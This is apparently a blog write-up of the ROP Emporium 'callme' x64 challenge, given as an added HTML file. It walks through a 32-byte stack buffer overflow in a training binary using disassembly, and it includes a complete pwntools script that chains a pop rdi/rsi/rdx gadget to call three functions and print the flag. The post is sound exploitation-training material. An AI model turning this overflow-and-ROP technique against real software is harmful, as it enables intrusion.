@@ -1,0 +1,297 @@
+I"œa<h2 id="introduction">Introduction</h2>
+
+<p>Challenge Description</p>
+
+<p>The goal of the challenge is understanding how more than one argument is passed in x64 function. The challenge can be downloaded from the author`s website <a href="https://ropemporium.com">ropemporium</a></p>
+
+<blockquote>
+  <p>Reliably make consecutive calls to imported functions.
+Use some new techniques and learn about the Procedure Linkage Table.</p>
+</blockquote>
+
+<p>The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.</p>
+
+<blockquote>
+  <p><strong>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</strong></p>
+</blockquote>
+
+<p>check the binary protections enabled on the <code class="language-plaintext highlighter-rouge">callme</code> binary, only <strong>NX</strong>( Not Executable) is enabled on the binary as shown below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>vx@archie:callme<span class="nv">$ </span>checksec <span class="nt">--file</span> callme
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+    RUNPATH:  b<span class="s1">'.'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Open <strong>callme</strong> binary in radare2 to look for exploitable vulnerability and examine the behavior. radare2 is a powerful disassembler/debugging tool used for examining the behavior of programs.</p>
+
+<p><img src="/assets/images/ropemporium/callme_bug.png" alt="" /></p>
+
+<p>From the above image we use <strong>pdf</strong> command to disassemble a given function. Function <strong>pwnme</strong> looks similar to the previous challenges ret2win and split.</p>
+
+<p>From the aDisassembled program, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory area we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the address of base pointer in the stack.
+<img src="/assets/images/ropemporium/stack.png" alt="" /></p>
+
+<p>Next function is read function, which reads for user input and stores in the allocated buffer.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>From assembly code, we are reading <code class="language-plaintext highlighter-rouge">0x200</code> bytes from the standard input file descriptor and storing it in buffer, meaning we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.</p>
+
+<p>For exploitation stack overflow, fill the buffer, overwrite rbp register and control the return address with desired address.</p>
+
+<p>Because the system function receives one argument, look for one gadgets that we control the rdi, rsi and rdx registers.</p>
+
+<p><strong>What are gadgets?</strong></p>
+
+<p>Gadgets are sequence of instructions the end with ret. because we want to load three argument into registers, we will look for a pop rdi, pop rsi, pop rdx; ret instruction in order to pass an arguments to the callme_one, callme_two, callme_three functions.</p>
+
+<p>The example of the <strong>pop rdi,pop rsi,pop rdx, ret</strong> gadget is shown in image below.</p>
+
+<p><img src="/assets/images/ropemporium/poprdi_callme.png" alt="" />
+Next is determine addresses of <code class="language-plaintext highlighter-rouge">callme_one</code>, <code class="language-plaintext highlighter-rouge">callme_two</code>, <code class="language-plaintext highlighter-rouge">callme_three</code> functions using gdb.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">info</span> <span class="nv">functions</span>
+<span class="nf">All</span> <span class="nv">defined</span> <span class="nv">functions</span><span class="p">:</span>
+<span class="nf">Non</span><span class="o">-</span><span class="nv">debugging</span> <span class="nv">symbols</span><span class="p">:</span>
+<span class="err">0</span><span class="nf">x00000000004006a8</span>  <span class="nv">_init</span>
+<span class="err">0</span><span class="nf">x00000000004006d0</span>  <span class="nv">puts@plt</span>
+<span class="err">0</span><span class="nf">x00000000004006e0</span>  <span class="nv">printf@plt</span>
+<span class="err">0</span><span class="nf">x00000000004006f0</span>  <span class="nv">callme_three@plt</span>
+<span class="err">0</span><span class="nf">x0000000000400700</span>  <span class="nv">memset@plt</span>
+<span class="err">0</span><span class="nf">x0000000000400710</span>  <span class="nv">read@plt</span>
+<span class="err">0</span><span class="nf">x0000000000400720</span>  <span class="nv">callme_one@plt</span>
+<span class="err">0</span><span class="nf">x0000000000400730</span>  <span class="nv">setvbuf@plt</span>
+<span class="err">0</span><span class="nf">x0000000000400740</span>  <span class="nv">callme_two@plt</span>
+<span class="err">0</span><span class="nf">x0000000000400750</span>  <span class="nv">exit@plt</span>
+<span class="err">0</span><span class="nf">x0000000000400760</span>  <span class="nv">_start</span>
+<span class="err">0</span><span class="nf">x0000000000400790</span>  <span class="nv">_dl_relocate_static_pie</span>
+<span class="err">0</span><span class="nf">x00000000004007a0</span>  <span class="nv">deregister_tm_clones</span>
+<span class="err">0</span><span class="nf">x00000000004007d0</span>  <span class="nv">register_tm_clones</span>
+<span class="err">0</span><span class="nf">x0000000000400810</span>  <span class="nv">__do_global_dtors_aux</span>
+<span class="err">0</span><span class="nf">x0000000000400840</span>  <span class="nv">frame_dummy</span>
+<span class="err">0</span><span class="nf">x0000000000400847</span>  <span class="nv">main</span>
+<span class="err">0</span><span class="nf">x0000000000400898</span>  <span class="nv">pwnme</span>
+<span class="err">0</span><span class="nf">x00000000004008f2</span>  <span class="nv">usefulFunction</span>
+<span class="err">0</span><span class="nf">x000000000040093c</span>  <span class="nv">usefulGadgets</span>
+<span class="err">0</span><span class="nf">x0000000000400940</span>  <span class="nv">__libc_csu_init</span>
+<span class="err">0</span><span class="nf">x00000000004009b0</span>  <span class="nv">__libc_csu_fini</span>
+<span class="err">0</span><span class="nf">x00000000004009b4</span>  <span class="nv">_fini</span>
+<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Reverse engineer one of the target function in order to understand how the arguments are passed to the function.Because the <strong>callme</strong> binary does PLT relocations of the functions of callme, disassemble the target shared library <strong>libcallme.so</strong> as shown below.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td><td class="rouge-code"><pre><span class="nl">vx@archie:</span><span class="nf">callme$</span> <span class="nv">gdb</span> <span class="o">-</span><span class="nv">q</span> <span class="nv">libcallme.so</span>
+<span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="nv">libcallme.so...</span>
+<span class="err">(</span><span class="nf">No</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span> <span class="nv">in</span> <span class="nv">libcallme.so</span><span class="p">)</span>
+<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">callme_one</span>
+<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">callme_one</span><span class="p">:</span>
+   <span class="err">0</span><span class="nf">x000000000000081a</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">rbp</span>
+   <span class="err">0</span><span class="nf">x000000000000081b</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rsp</span>
+   <span class="err">0</span><span class="nf">x000000000000081e</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x30</span>
+   <span class="err">0</span><span class="nf">x0000000000000822</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">],</span><span class="nb">rdi</span>
+   <span class="err">0</span><span class="nf">x0000000000000826</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">],</span><span class="nb">rsi</span>
+   <span class="err">0</span><span class="nf">x000000000000082a</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">],</span><span class="nb">rdx</span>
+   <span class="err">0</span><span class="nf">x000000000000082e</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movabs</span> <span class="nb">rax</span><span class="p">,</span><span class="mh">0xdeadbeefdeadbeef</span>
+   <span class="err">0</span><span class="nf">x0000000000000838</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">],</span><span class="nb">rax</span>
+   <span class="err">0</span><span class="nf">x000000000000083c</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x912</span> <span class="o">&lt;</span><span class="nv">callme_one</span><span class="o">+</span><span class="mi">248</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000000842</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movabs</span> <span class="nb">rax</span><span class="p">,</span><span class="mh">0xcafebabecafebabe</span>
+   <span class="err">0</span><span class="nf">x000000000000084c</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">],</span><span class="nb">rax</span>
+   <span class="err">0</span><span class="nf">x0000000000000850</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x912</span> <span class="o">&lt;</span><span class="nv">callme_one</span><span class="o">+</span><span class="mi">248</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000000856</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movabs</span> <span class="nb">rax</span><span class="p">,</span><span class="mh">0xd00df00dd00df00d</span>
+   <span class="err">0</span><span class="nf">x0000000000000860</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">],</span><span class="nb">rax</span>
+   <span class="err">0</span><span class="nf">x0000000000000864</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x912</span> <span class="o">&lt;</span><span class="nv">callme_one</span><span class="o">+</span><span class="mi">248</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x000000000000086a</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0x0</span>
+   <span class="err">0</span><span class="nf">x0000000000000872</span> <span class="o">&lt;+</span><span class="mi">88</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rsi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x32f</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xba8</span>
+   <span class="err">0</span><span class="nf">x0000000000000879</span> <span class="o">&lt;+</span><span class="mi">95</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x32a</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xbaa</span>
+   <span class="err">0</span><span class="nf">x0000000000000912</span> <span class="o">&lt;+</span><span class="mi">248</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x301</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xc1a</span>
+   <span class="err">0</span><span class="nf">x0000000000000919</span> <span class="o">&lt;+</span><span class="mi">255</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x6c0</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x000000000000091e</span> <span class="o">&lt;+</span><span class="mi">260</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x1</span>
+   <span class="err">0</span><span class="nf">x0000000000000923</span> <span class="o">&lt;+</span><span class="mi">265</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x720</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000000928</span> <span class="o">&lt;+</span><span class="mi">270</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">nop</span>
+   <span class="err">0</span><span class="nf">x0000000000000929</span> <span class="o">&lt;+</span><span class="mi">271</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">leave</span>
+   <span class="err">0</span><span class="nf">x000000000000092a</span> <span class="o">&lt;+</span><span class="mi">272</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
+<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
+<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>From the disassembly code above, the function compares the arguments passed to the callme_one function. If string values are not equal to values passed to the <code class="language-plaintext highlighter-rouge">rdi</code>, <code class="language-plaintext highlighter-rouge">rsi</code> and <code class="language-plaintext highlighter-rouge">rdx</code> registers the program exits, otherwise we get a flag.</p>
+
+<p>From previous knowledge of solving other challenges, we need to overwrite the return address with controlled pop rdi, pop rsi, pop rdx, ret gadget and call each function in a sequential manner.</p>
+
+<p>Fully working rop chain code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="c1">#Various setting for pwntools
+</span><span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s">"latin-1"</span>
+<span class="n">pwn</span><span class="p">.</span><span class="n">warnings</span><span class="p">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>
+<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'./callme'</span><span class="p">)</span>
+
+<span class="n">pop_rdi_rsi_rdx</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0040093c</span><span class="p">)</span>  <span class="c1">#pop rdi; pop rsi; pop rdx; ret gadget
+</span><span class="n">arg1</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">arg2</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span>
+<span class="n">arg3</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span>
+
+<span class="n">callme_one_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400720</span><span class="p">)</span>
+<span class="n">callme_two_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400740</span><span class="p">)</span>
+<span class="n">callme_three_addr</span> <span class="o">=</span><span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004006f0</span><span class="p">)</span>
+
+<span class="c1">#call the callme_one function
+</span><span class="n">callme_one</span> <span class="o">=</span> <span class="n">pop_rdi_rsi_rdx</span>
+<span class="n">callme_one</span> <span class="o">+=</span> <span class="n">arg1</span>
+<span class="n">callme_one</span> <span class="o">+=</span> <span class="n">arg2</span>
+<span class="n">callme_one</span> <span class="o">+=</span> <span class="n">arg3</span>
+<span class="n">callme_one</span> <span class="o">+=</span> <span class="n">callme_one_addr</span>
+
+<span class="c1">#callme_two function
+</span><span class="n">callme_two</span> <span class="o">=</span> <span class="n">pop_rdi_rsi_rdx</span>
+<span class="n">callme_two</span> <span class="o">+=</span> <span class="n">arg1</span>
+<span class="n">callme_two</span> <span class="o">+=</span> <span class="n">arg2</span>
+<span class="n">callme_two</span>  <span class="o">+=</span> <span class="n">arg3</span>
+<span class="n">callme_two</span> <span class="o">+=</span> <span class="n">callme_two_addr</span>
+
+<span class="c1">#callme_three function
+</span><span class="n">callme_three</span> <span class="o">=</span> <span class="n">pop_rdi_rsi_rdx</span>
+<span class="n">callme_three</span> <span class="o">+=</span> <span class="n">arg1</span>
+<span class="n">callme_three</span> <span class="o">+=</span> <span class="n">arg2</span>
+<span class="n">callme_three</span> <span class="o">+=</span> <span class="n">arg3</span>
+<span class="n">callme_three</span> <span class="o">+=</span> <span class="n">callme_three_addr</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span><span class="mi">32</span>   <span class="c1">#fill the buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>  <span class="c1">#overwrite the rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_one</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_two</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_three</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">writeafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">clean</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Successful execution of the above code, correct flag is printed.</p>
+
+<p><img src="/assets/images/ropemporium/callme-flag.png" alt="" /></p>
+:ET
